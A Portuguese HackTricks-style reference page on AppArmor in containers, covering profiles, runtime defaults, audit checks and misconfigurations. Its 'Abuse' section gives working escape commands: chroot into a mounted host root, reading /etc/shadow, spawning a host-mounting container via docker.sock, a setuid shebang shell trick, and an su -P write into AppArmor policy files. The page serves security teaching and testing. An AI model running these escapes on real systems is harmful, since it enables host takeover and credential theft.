# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

AppArmor é um sistema de **Controle de Acesso Obrigatório** que aplica restrições por meio de perfis específicos para cada programa. Diferentemente das verificações tradicionais de DAC, que dependem bastante da propriedade de usuários e grupos, o AppArmor permite que o kernel aplique uma política associada ao próprio processo. Em ambientes de contêineres, isso é importante porque uma carga de trabalho pode ter privilégios tradicionais suficientes para tentar uma ação e, ainda assim, ser impedida porque o perfil AppArmor não permite o caminho, a montagem, o comportamento de rede ou o uso de capability relevante.

O ponto conceitual mais importante é que o AppArmor é **baseado em caminhos**. Ele avalia o acesso ao sistema de arquivos por meio de regras de caminho, em vez de usar rótulos, como o SELinux. Isso o torna acessível e poderoso, mas também significa que bind mounts e layouts alternativos de caminhos exigem atenção especial. Se o mesmo conteúdo do host ficar acessível por um caminho diferente, o efeito da política pode não ser o que o operador esperava inicialmente.

## Papel no isolamento de contêineres

As análises de segurança de contêineres muitas vezes param nas capabilities e no seccomp, mas o AppArmor continua sendo importante depois dessas verificações. Imagine um contêiner com mais privilégios do que deveria ou uma carga de trabalho que precisava de uma capability adicional por motivos operacionais. O AppArmor ainda pode restringir o acesso a arquivos, o comportamento de montagem, a rede e os padrões de execução, impedindo os caminhos óbvios de abuso. Por isso, desabilitar o AppArmor "só para fazer o aplicativo funcionar" pode transformar silenciosamente uma configuração apenas arriscada em uma configuração ativamente explorável.

## Laboratório

Para verificar se o AppArmor está ativo no host, use:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Para ver sob qual perfil o processo atual do contêiner está sendo executado:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

A diferença é instrutiva. No caso normal, o processo deve exibir um contexto AppArmor vinculado ao perfil escolhido pelo runtime. No caso unconfined, essa camada extra de restrição desaparece.

Você também pode inspecionar o que o Docker acredita ter aplicado:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Uso em tempo de execução

O Docker pode aplicar um perfil AppArmor padrão ou personalizado quando o host oferece suporte a ele. O Podman também pode integrar-se ao AppArmor em sistemas baseados em AppArmor, embora, em distribuições que priorizam SELinux, o outro sistema MAC geralmente tenha mais destaque. O Kubernetes pode disponibilizar políticas AppArmor no nível da carga de trabalho em nós que realmente oferecem suporte a AppArmor. O LXC e ambientes relacionados de contêineres de sistema da família Ubuntu também usam AppArmor extensivamente.

O ponto prático é que AppArmor não é um "recurso do Docker". É um recurso do kernel do host que vários runtimes podem optar por aplicar. Se o host não oferecer suporte a ele ou se o runtime for configurado para executar sem confinamento, a suposta proteção não estará realmente presente.

Especificamente para Kubernetes, a API moderna é `securityContext.appArmorProfile`. Desde o Kubernetes `v1.30`, as antigas anotações beta do AppArmor estão obsoletas. Em hosts compatíveis, `RuntimeDefault` é o perfil padrão, enquanto `Localhost` aponta para um perfil que já precisa estar carregado no nó. Isso é importante durante a revisão porque um manifesto pode parecer compatível com AppArmor, embora ainda dependa inteiramente do suporte no nó e de perfis pré-carregados.<sup>[[1]](#references)</sup>

Um detalhe operacional sutil, mas útil, é que definir explicitamente `appArmorProfile.type: RuntimeDefault` é mais rigoroso do que simplesmente omitir o campo. Se o campo for definido explicitamente e o nó não oferecer suporte a AppArmor, a admissão deverá falhar. Se o campo for omitido, a carga de trabalho ainda poderá ser executada em um nó sem AppArmor e simplesmente não receber essa camada extra de confinamento. Do ponto de vista de um atacante, esse é um bom motivo para verificar tanto o manifesto quanto o estado real do nó.<sup>[[1]](#references)</sup>

Em hosts compatíveis com AppArmor e Docker, o padrão mais conhecido é `docker-default`. Esse perfil é gerado a partir do template AppArmor do Moby e é importante porque explica por que alguns PoCs baseados em capabilities ainda falham em um contêiner padrão. Em termos gerais, `docker-default` permite o uso normal da rede, nega gravações em grande parte de `/proc`, nega acesso a partes sensíveis de `/sys`, bloqueia operações de montagem e restringe ptrace para que não seja um recurso genérico de sondagem do host. Entender essa linha de base ajuda a distinguir entre "o contêiner tem `CAP_SYS_ADMIN`" e "o contêiner consegue realmente usar essa capability contra as interfaces do kernel que me interessam".

## Gerenciamento de perfis

Os perfis AppArmor geralmente ficam armazenados em `/etc/apparmor.d/`. Uma convenção comum de nomenclatura é substituir as barras no caminho do executável por pontos. Por exemplo, um perfil para `/usr/bin/man` costuma ser armazenado como `/etc/apparmor.d/usr.bin.man`. Esse detalhe é importante tanto na defesa quanto na avaliação, porque, quando você conhece o nome do perfil ativo, geralmente consegue localizar rapidamente o arquivo correspondente no host.

Comandos úteis de gerenciamento no host incluem:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

O motivo pelo qual esses comandos são importantes em uma referência sobre segurança de containers é que eles explicam como os perfis são realmente criados, carregados, alterados para o modo complain e modificados após mudanças na aplicação. Se um operador costuma alterar os perfis para o modo complain durante a solução de problemas e se esquece de restaurar a aplicação das regras, o container pode parecer protegido na documentação, mas, na prática, comportar-se de maneira muito mais permissiva.

### Criando e atualizando perfis

`aa-genprof` pode observar o comportamento da aplicação e ajudar a gerar um perfil interativamente:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` pode gerar um perfil de modelo que pode ser carregado posteriormente com `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Quando o binário muda e a política precisa ser atualizada, `aa-logprof` pode reproduzir as negações encontradas nos logs e ajudar o operador a decidir se deve permiti-las ou negá-las:

```bash
sudo aa-logprof
```

### Registros

As negações do AppArmor costumam ser visíveis pelo `auditd`, pelo syslog ou por ferramentas como `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Isso é útil operacionalmente e ofensivamente. Os defensores usam isso para refinar perfis. Os atacantes usam isso para descobrir qual caminho ou operação exata está sendo negada e se o AppArmor é o controle que está bloqueando uma cadeia de exploração.

### Identificando o arquivo de perfil exato

Quando um runtime mostra um nome de perfil AppArmor específico para um contêiner, geralmente é útil relacionar esse nome ao arquivo de perfil no disco:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Isso é especialmente útil durante a revisão no host, pois faz a ponte entre “o container diz que está sendo executado sob o profile `lowpriv`” e “as regras reais estão neste arquivo específico, que pode ser auditado ou recarregado”.

### Regras de alto sinal para auditar

Quando puder ler um profile, não se limite a linhas simples de `deny`. Vários tipos de regra alteram significativamente a eficácia do AppArmor contra uma tentativa de container escape:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: executa o binário de destino sem confinamento. Se um auxiliar, shell ou interpretador acessível for permitido sob `ux`, geralmente essa é a primeira coisa a testar.
- `px` / `Px` e `cx` / `Cx`: realizam transições de profile no `exec`. Não são automaticamente ruins, mas merecem auditoria, pois uma transição pode levar a um profile muito mais permissivo que o atual.
- `change_profile`: permite que uma tarefa mude para outro profile carregado, imediatamente ou no próximo `exec`. Se o profile de destino for mais fraco, isso pode se tornar a saída de escape prevista de um domínio restritivo.
- `flags=(complain)`, `flags=(unconfined)` ou o mais recente `flags=(prompt)`: esses valores devem alterar o grau de confiança que você deposita no profile. `complain` registra as negações em vez de aplicá-las, `unconfined` remove o limite, e `prompt` depende de um fluxo de decisão no userspace em vez de uma negação aplicada exclusivamente pelo kernel.
- `userns` ou `userns create,`: políticas mais recentes do AppArmor podem mediar a criação de user namespaces. Se um profile de container permitir isso explicitamente, user namespaces aninhados continuam possíveis mesmo quando a plataforma usa AppArmor como parte da estratégia de hardening.

Comando `grep` útil no host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Esse tipo de auditoria costuma ser mais útil do que analisar centenas de regras comuns de arquivos. Se um breakout depende da execução de um helper, da entrada em um novo namespace ou da fuga para um profile menos restritivo, a resposta costuma estar oculta nessas regras voltadas a transições, e não nas linhas óbvias no estilo `deny /etc/shadow r`.

## Misconfigurations

O erro mais óbvio é `apparmor=unconfined`. Administradores costumam defini-lo ao depurar um aplicativo que falhou porque o profile bloqueou corretamente algo perigoso ou inesperado. Se essa flag permanecer em produção, toda a camada MAC terá sido efetivamente removida.

Outro problema sutil é presumir que bind mounts são inofensivos porque as permissões dos arquivos parecem normais. Como o AppArmor é baseado em caminhos, expor caminhos do host em locais de montagem alternativos pode interagir mal com as regras de caminhos. Um terceiro erro é esquecer que o nome de um profile em um arquivo de configuração significa muito pouco se o kernel do host não estiver realmente aplicando o AppArmor.

## Abuse

Quando o AppArmor é removido, operações antes restringidas podem funcionar de repente: ler caminhos sensíveis por meio de bind mounts, acessar partes de procfs ou sysfs cujo uso deveria continuar mais restrito, executar ações relacionadas à montagem se as capabilities/seccomp também permitirem, ou usar caminhos que um profile normalmente negaria. Muitas vezes, o AppArmor é o mecanismo que explica por que uma tentativa de breakout baseada em capabilities, que "deveria funcionar" no papel, ainda falha na prática. Remova o AppArmor, e a mesma tentativa pode começar a funcionar.

Se você suspeitar que o AppArmor é o principal obstáculo a uma cadeia de abuso baseada em path-traversal, bind mounts ou montagens, o primeiro passo costuma ser comparar o que fica acessível com e sem um profile. Por exemplo, se um caminho do host estiver montado dentro do container, comece verificando se você consegue percorrê-lo e lê-lo:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Se o contêiner também tiver uma capability perigosa, como `CAP_SYS_ADMIN`, um dos testes mais práticos é verificar se o AppArmor é o controle que está bloqueando operações de mount ou o acesso a sistemas de arquivos sensíveis do kernel:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Em ambientes nos quais um caminho do host já está acessível por meio de uma montagem bind, a perda do AppArmor também pode transformar uma vulnerabilidade de divulgação de informações somente leitura em acesso direto aos arquivos do host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

O objetivo desses comandos não é que o AppArmor, por si só, cause o breakout. É que, assim que o AppArmor é removido, muitos caminhos de abuso baseados em filesystem e mounts podem ser testados imediatamente.

### Exemplo completo: AppArmor desativado + root do host montado

Se o root do host já estiver montado por bind no container em `/host`, remover o AppArmor pode transformar um caminho de abuso de filesystem bloqueado em um escape completo do host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Uma vez que o shell está sendo executado por meio do sistema de arquivos do host, a carga de trabalho efetivamente escapou dos limites do contêiner:

```bash
id
hostname
cat /etc/shadow | head
```

### Exemplo completo: AppArmor desativado + soquete do runtime

Se a barreira real era o AppArmor em torno do estado do runtime, um soquete montado pode ser suficiente para uma fuga completa:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

O caminho exato depende do ponto de montagem, mas o resultado final é o mesmo: o AppArmor deixa de impedir o acesso à API do runtime, e a API do runtime pode iniciar um container que compromete o host.

### Exemplo completo: bypass de bind-mount baseado em caminho

Como o AppArmor é baseado em caminhos, proteger `/proc/**` não protege automaticamente o mesmo conteúdo do procfs do host quando ele pode ser acessado por outro caminho:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

O impacto depende exatamente do que está montado e de se o caminho alternativo também contorna outros controles, mas esse padrão é um dos motivos mais claros pelos quais o AppArmor deve ser avaliado junto com a configuração de montagem, e não isoladamente.

### Exemplo completo: bypass de shebang

O AppArmor pode associar um perfil ao caminho do script executado, em vez de ao interpretador indicado pelo shebang. Por outro lado, invocar o interpretador diretamente pode selecionar o perfil do interpretador. Um [mantenedor do AppArmor descreve essa distinção](https://bugs.launchpad.net/apparmor/+bug/1911431). Um exemplo histórico envolvia um script cuja primeira linha apontava para um interpretador confinado:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

O exemplo é apenas um caso candidato em que a capability de arquivo do interpretador pode se tornar efetiva e o anexo de execução efetivo do script permite a operação. Verifique a policy carregada e o rótulo do processo, o conjunto de capabilities limitantes, `no_new_privs` e o estado `nosuid` da montagem; apenas o nome de um arquivo de perfil ou uma listagem `cap_setuid+ep` não comprova que a transição pode ser usada. Cadeias de interpretadores e caminhos alternativos de execução merecem uma análise separada.

## Arquivos de controle da policy como primitiva de escrita privilegiada

Em kernels AppArmor afetados, um usuário sem privilégios pode abrir o arquivo `.load`, `.replace` ou `.remove` do securityfs para escrita, mas uma chamada direta a `write()` falha porque a permissão de administração da policy é verificada no momento da escrita. Se um helper setuid herdar esse descritor como stdout ou stderr e escrever bytes controlados pelo atacante, o kernel usará as credenciais do helper. Isso torna o helper um *escritor privilegiado* de dados de policy, não uma forma geral de conceder root a quem chama. A Qualys demonstrou que `su -P` pode retransmitir bytes de um comando executado pelo mesmo usuário por meio de seu caminho privilegiado de PTY; esse caminho exige que haja uma senha definida para a conta do usuário. Verifique as correções instaladas do kernel e do `su`, em vez de considerar que um modo de arquivo gravável por todos comprova a exposição.<sup>[[3]](#references)[[4]](#references)</sup>

Em um laboratório descartável com um kernel e um helper afetados, isto cria e depois remove um perfil de teste. O shell abre cada arquivo de controle antes de `su` escrever nele; `stty raw` impede que a retransmissão do PTY altere os bytes do perfil compilado. Não execute o teste em um perfil de produção.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

A mesma primitiva pode substituir um perfil existente. Por exemplo, um perfil que permite `userns` para um launcher pode remover uma restrição do AppArmor a user namespaces, mas não concede capabilities de root no host; os sysctls reais de namespaces e outros controles ainda importam. Ela também pode remover o confinamento de um processo-alvo. Consulte as [verificações de exposição do kernel](../../../main-system-information/kernel-vulnerability-assessment.md) e a [visão geral do Linux Hardening](../../../) para conhecer o fluxo mais amplo de escalonamento de privilégios.<sup>[[3]](#references)[[4]](#references)</sup>

## Verificações

O objetivo destas verificações é responder rapidamente a três perguntas: o AppArmor está habilitado no host, o processo atual está confinado e o runtime realmente aplicou um perfil a este container?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

O que é interessante aqui:

- Se `/proc/self/attr/current` mostra `unconfined`, a carga de trabalho não está se beneficiando do confinamento do AppArmor.
- Se `aa-status` mostra que o AppArmor está desativado ou não carregado, qualquer nome de perfil na configuração do runtime é, em grande parte, cosmético.
- Se `docker inspect` mostra `unconfined` ou um perfil personalizado inesperado, esse costuma ser o motivo pelo qual um caminho de abuso baseado em sistema de arquivos ou montagem funciona.
- Se `/sys/kernel/security/apparmor/profiles` não contém o perfil esperado, a configuração do runtime ou do orquestrador, por si só, não é suficiente.
- Se um perfil supostamente reforçado contém regras no estilo `ux`, `change_profile` abrangente, `userns` ou `flags=(complain)`, o limite prático pode ser muito mais fraco do que o nome do perfil sugere.

Se um contêiner já tem privilégios elevados por motivos operacionais, manter o AppArmor habilitado costuma ser o que diferencia uma exceção controlada de uma falha de segurança muito mais ampla.

## Padrões de runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por padrão em hosts compatíveis com AppArmor | Usa o perfil AppArmor `docker-default`, a menos que seja substituído | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Depende do host | O AppArmor é compatível por meio de `--security-opt`, mas o padrão exato depende do host/runtime e é menos universal que o perfil `docker-default` documentado pelo Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Padrão condicional | Se `appArmorProfile.type` não for especificado, o padrão é `RuntimeDefault`, mas ele só é aplicado quando o AppArmor está habilitado no nó | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` com um perfil fraco, nós sem suporte ao AppArmor |
| containerd / CRI-O no Kubernetes | Segue o suporte do nó/runtime | Runtimes compatíveis com Kubernetes geralmente oferecem suporte ao AppArmor, mas a aplicação efetiva ainda depende do suporte do nó e das configurações da carga de trabalho | O mesmo que na linha do Kubernetes; a configuração direta do runtime também pode ignorar completamente o AppArmor |

No caso do AppArmor, a variável mais importante costuma ser o **host**, não apenas o runtime. Uma configuração de perfil em um manifesto não cria confinamento em um nó onde o AppArmor não está habilitado.



## References

- [1] [Contexto de segurança do Kubernetes: campos do perfil AppArmor e comportamento do suporte no nó](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Página de manual `apparmor.d(5)` do Ubuntu 24.04: transições de exec, `change_profile`, `userns` e flags de perfil](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Aviso técnico do Qualys CrackArmor](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Base de conhecimento sobre a vulnerabilidade CrackArmor do Ubuntu](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
